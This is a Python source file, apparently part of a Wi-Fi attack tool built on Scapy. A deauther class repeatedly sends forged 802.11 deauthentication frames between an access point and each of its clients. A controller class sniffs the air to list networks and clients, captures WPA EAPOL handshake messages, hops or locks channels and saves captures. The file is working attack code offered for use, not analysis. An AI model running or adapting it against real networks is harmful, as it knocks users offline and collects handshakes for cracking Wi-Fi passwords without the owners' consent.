from scapy.all import *
from scapy.layers.eap import *
from scapy.layers.dot11 import *

import threading

from access_point import *
from change_channel import *
from capture_manager import *


class Deauther():

    def __init__(self, ap: AccessPoint, interface_name: str) -> None:
        self.ap = ap
        self.interface_name = interface_name
        self.packet_count = 0
        self.packets_sent = 0

    def deauth(self) -> None:
        """Craft and send deauthentication packets"""
        self.packets_sent = 0
        # Number of packets to send
        self.packet_count = 10 * len(self.ap.clients)
        while not self.packets_sent >= self.packet_count:
            for client in self.ap.clients:
                # From AP to client
                ap_to_client = RadioTap() / Dot11(type=0, subtype=12, addr1=self.ap.bssid,
                                                    addr2=client, addr3=self.ap.bssid) / Dot11Deauth()
                # From client to AP
                client_to_ap = RadioTap() / Dot11(type=0, subtype=12, addr1=client,
                                                    addr2=self.ap.bssid, addr3=self.ap.bssid) / Dot11Deauth()

                # Send packets and update packet count
                sendp(ap_to_client, iface=self.interface_name, verbose=False)
                self.packets_sent += 1
                sendp(client_to_ap, iface=self.interface_name, verbose=False)
                self.packets_sent += 1


class NetworkController():

    def __init__(
            self,
            interface_name: str,
            channel_table: dict,
            start_channel: int) -> None:
        self.interface_name = interface_name
        self.channel_table = channel_table
        self.start_channel = start_channel
        self.access_points = []
        self.selected_ap = None
        self.capture_manager = CaptureManager('captures/')

        # Access point MAC addresses
        self.ap_bssids = set()

        # BSSID:AccessPoint
        self.bssid_map = {}

        # SSID:AccessPoint
        self.ssid_map = {}

        self.sniff_thread = None
        self.deauth_thread = None
        self.channel_switch_thread = None

        self.stop_sniff = threading.Event()
        self.stop_changing_channel = threading.Event()
        self.stop_deauth = threading.Event()

        self.deauther = None
        self.deauth_packet_count = 0
        self.max_packets = 0

    def create_deauther(self) -> None:
        self.deauther = Deauther(self.selected_ap, self.interface_name)

    def stop_all(self) -> None:
        self.stop_sniff.set()
        self.stop_changing_channel.set()
        self.stop_deauth.set()

    def handle_packet(self, pkt: Packet) -> None:
        """Handle different types of 802.11 frames"""

        # Handle beacon frames
        if pkt.haslayer(
                Dot11Beacon) and pkt[Dot11].type == 0 and pkt[Dot11].subtype == 8:
            self.handle_beacon(pkt)

        # Handle EAPOL frame (handshake)
        elif pkt.haslayer(EAPOL):
            self.handle_eapol(pkt)

        # Handle probe requests
        elif pkt.haslayer(Dot11ProbeReq) and pkt[Dot11].type == 0 and pkt[Dot11].subtype == 4:
            ssid = pkt[Dot11ProbeReq].info.decode()
            if ssid:
                ap = self.ssid_map.get(ssid)
                if ap and pkt[Dot11].addr2 not in ap.clients:
                    ap.add_client(pkt[Dot11].addr2)

        # Handle association requests
        elif pkt.haslayer(Dot11AssoReq) and pkt[Dot11].type == 0 and pkt[Dot11].subtype == 0:
            source = pkt[Dot11].addr2
            bssid = pkt[Dot11].addr1
            if bssid in self.bssid_map and source not in self.bssid_map[bssid].clients:
                self.bssid_map[bssid].add_client(source)

        # Handle data frames
        elif pkt.haslayer(Dot11) and pkt[Dot11].type == 2:
            match pkt[Dot11].subtype:
                # Data frame
                case 0:
                    source = pkt[Dot11].addr2
                    destination = pkt[Dot11].addr1
                    self.process_client_data_frame(source, destination)

                # Null data frame
                case 4:
                    source = pkt[Dot11].addr2
                    destination = pkt[Dot11].addr3
                    self.process_client_data_frame(source, destination)

                # QoS data frame
                case 8:
                    source = pkt[Dot11].addr2
                    destination = pkt[Dot11].addr3
                    self.process_client_data_frame(source, destination)

    def handle_beacon(self, pkt: Packet) -> None:
        """Handle beacon frames"""

        bssid = pkt[Dot11].addr3
        ssid = pkt[Dot11Elt].info.decode()
        signal_strength = pkt[RadioTap].dBm_AntSignal
        channel = self.channel_table[pkt[RadioTap].Channel]

        # Some APs have hidden SSIDs
        if not ssid:
            ssid = 'HIDDEN SSID'

        if bssid not in self.ap_bssids:
            self.ap_bssids.add(bssid)
            ap = AccessPoint(ssid, bssid, signal_strength, channel, pkt)
            self.access_points.append(ap)
            self.bssid_map[bssid] = ap
            self.ssid_map[ssid] = ap
        else:
            self.bssid_map[bssid].update_signal_strength(signal_strength)
            self.bssid_map[bssid].update_channel(channel)

    def handle_eapol(self, pkt: Packet) -> None:
        """Process EAPOL packet, save key message type"""
        # Message type (1/2/3/4/0)
        msg_type = pkt[EAPOL_KEY].guess_key_number()

        if pkt[Dot11].addr1 in self.bssid_map:
            self.bssid_map[pkt[Dot11].addr1].eapol_messages[msg_type] = pkt
        elif pkt[Dot11].addr2 in self.bssid_map:
            self.bssid_map[pkt[Dot11].addr2].eapol_messages[msg_type] = pkt
        elif pkt[Dot11].addr3 in self.bssid_map:
            self.bssid_map[pkt[Dot11].addr3].eapol_messages[msg_type] = pkt

    def process_client_data_frame(self, src: str, dest: str) -> None:
        if dest in self.bssid_map.keys() and dest != 'ff:ff:ff:ff:ff:ff':
            if src not in self.bssid_map[dest].clients:
                self.bssid_map[dest].add_client(src)

    def start_sniffing(self, filter: str = '') -> None:
        sniff(
            iface=self.interface_name,
            prn=self.handle_packet,
            store=False,
            filter=filter,
            stop_filter=lambda x: self.stop_sniff.is_set()
        )

    def start_channel_hopping(self) -> None:
        change_channel(
            self.start_channel,
            self.interface_name,
            self.stop_changing_channel)

    def select_ap(self, ap: AccessPoint) -> None:
        self.capture_manager.ap = ap
        self.selected_ap = ap

    def lock_chnl(self) -> None:
        lock_channel(self.selected_ap.channel, self.interface_name)
